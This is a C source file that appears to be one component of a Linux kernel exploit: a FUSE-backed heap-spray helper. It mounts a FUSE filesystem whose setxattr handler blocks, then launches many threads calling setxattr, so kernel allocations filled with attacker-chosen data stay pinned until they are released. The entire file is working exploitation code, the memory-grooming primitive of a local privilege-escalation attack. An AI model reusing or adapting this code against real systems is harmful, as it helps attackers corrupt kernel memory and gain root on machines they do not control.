#define _GNU_SOURCE
#define FUSE_USE_VERSION 35
#include <fuse.h>
#include <sched.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include "common.h"
#include "spray.h"

#define FUSE_FS_PATH "fuse_fs"
#define FUSE_FS_FILENAME "fused"
#define FUSE_FS_FILE_PATH FUSE_FS_PATH "/" FUSE_FS_FILENAME

static int g_fuse_pipes[2] = {-1, -1};

static bool g_start_spray;
static const char* g_spray;
static size_t g_spray_size;
static pthread_t* g_threads;
static size_t g_num_threads;

static int fuse_getattr(const char* path, struct stat* st,
                        struct fuse_file_info* fi)
{
	// We need to implement this in order to call `setxattr` on FUSE_FS_FILENAME.
	memset(st, 0, sizeof(*st));
	if (strcmp(path, "/") == 0) {
		st->st_mode = S_IFDIR | 0755;
		st->st_nlink = 2;
	} else if (strcmp(path+1, FUSE_FS_FILENAME) == 0) {
		st->st_mode = S_IFREG | 0444;
		st->st_nlink = 1;
		st->st_size = 0x1000;
	} else {
		return -ENOENT;
	}
	return 0;
}

static int fuse_setxattr(const char* path, const char* name, const char* value,
                         size_t size, int flags)
{
	// Allocation and copy_from_user has already happened. Block until we are
	// told by spray_free().
	char signal;
	error_on(read(g_fuse_pipes[0], &signal, sizeof(signal)) == -1, "read pipe in setxattr");
	return 0;
}

static struct fuse_operations fuse_ops = {
	.getattr = fuse_getattr,
	.setxattr = fuse_setxattr,
};


static void* spray_thread(void* arg) {
	// Wait until we are told to start spraying
	while (!g_start_spray)
		sched_yield();

	// This will block
	int ret = setxattr(FUSE_FS_FILE_PATH, "name", g_spray, g_spray_size, 0);
	error_on(ret == -1, "setxattr");

	return NULL;
}

void spray_init_fuse_fs(void) {
	if (g_fuse_pipes[0] != -1)
		die("double spray_init_fuse\n");

	// Remove previously mounted FUSE fs if existed
	if (access(FUSE_FS_FILE_PATH, F_OK) == 0) {
		printf("Unmounting previously mounted FUSE fs\n");
		system("umount " FUSE_FS_PATH);
	}

	// Mount filesystem
	pipe(g_fuse_pipes);
	printf("Mounting FUSE fs\n");
	if (access(FUSE_FS_PATH, F_OK) == -1)
		mkdir(FUSE_FS_PATH, 0755);
	int pid = fork();
	if (!pid) {
		char* fuse_argv[] = {"exploit", FUSE_FS_PATH, NULL};
		fuse_main(sizeof(fuse_argv)/sizeof(*fuse_argv) - 1, fuse_argv, &fuse_ops, NULL);
		exit(EXIT_SUCCESS);
	}

	// Wait for FUSE filesystem to be available
	error_on(waitpid(pid, NULL, 0) == -1, "waitpid fuse");
	while (access(FUSE_FS_FILE_PATH, F_OK) == -1)
		sched_yield();
}

void spray_setup(const char* spray, size_t size, size_t n) {
	if (g_fuse_pipes[0] == -1)
		die("missing spray_init_fuse\n");

	// Save data
	if (g_spray)
		die("double spray_setup");
	g_spray = spray;
	g_spray_size = size;
	g_num_threads = n;

	// Create threads. Each thread will wait for us to set `g_start_spray`, and
	// then will call setxattr(), blocking until we write to the pipe in
	// spray_free().
	g_threads = calloc(g_num_threads, sizeof(*g_threads));
	for (size_t i = 0; i < g_num_threads; i++) {
		pthread_create(&g_threads[i], NULL, spray_thread, NULL);
	}
}

void spray_do(void) {
	if (!g_spray)
		die("missing spray_setup\n");
	g_start_spray = true;
}

void spray_free(void) {
	if (!g_start_spray)
		die("missing spray_do\n");

	// Unblock threads and wait for them to finish
	char signal;
	for (size_t i = 0; i < g_num_threads; i++) {
		write(g_fuse_pipes[1], &signal, sizeof(signal));
	}
	for (size_t i = 0; i < g_num_threads; i++) {
		pthread_join(g_threads[i], NULL);
	}

	// Clear state
	free(g_threads);
	g_threads = NULL;
	g_num_threads = 0;
	g_start_spray = false;
	g_spray = NULL;
	g_spray_size = 0;
}